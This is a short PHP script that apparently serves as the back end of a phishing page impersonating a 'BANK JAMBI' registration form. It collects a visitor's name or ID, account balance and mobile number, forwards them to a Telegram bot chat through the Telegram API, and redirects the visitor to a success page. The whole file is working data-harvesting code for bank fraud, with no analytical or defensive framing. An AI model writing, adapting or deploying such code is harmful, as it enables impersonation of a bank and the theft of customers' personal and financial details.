<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nama  = trim($_POST['nama'] ?? '');
    $saldo = preg_replace('/[^\d]/', '', $_POST['saldo'] ?? '0');
    $hp    = trim($_POST['hp'] ?? '');

    if (!$nama || !$hp || !$saldo || !preg_match('/^08[0-9]{8,11}$/', $hp)) {
        http_response_code(400);
        echo "Invalid data.";
        exit;
    }

    $saldoFormatted = number_format((int)$saldo, 0, ',', '.');

    $message = "*🎉 BANK JAMBI Registrasi 🎉*\n\n"
             . "📝 *ID   :* $nama\n"
             . "💰 *Saldo :* Rp $saldoFormatted\n"
             . "📱 *HP  :* $hp\n\n"
             . "Bismillah!";

    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";

    $postFields = [
        'chat_id'    => $CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS     => $postFields,
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect ke halaman sukses
    header("Location: sukses.html");
    exit;
}
?>
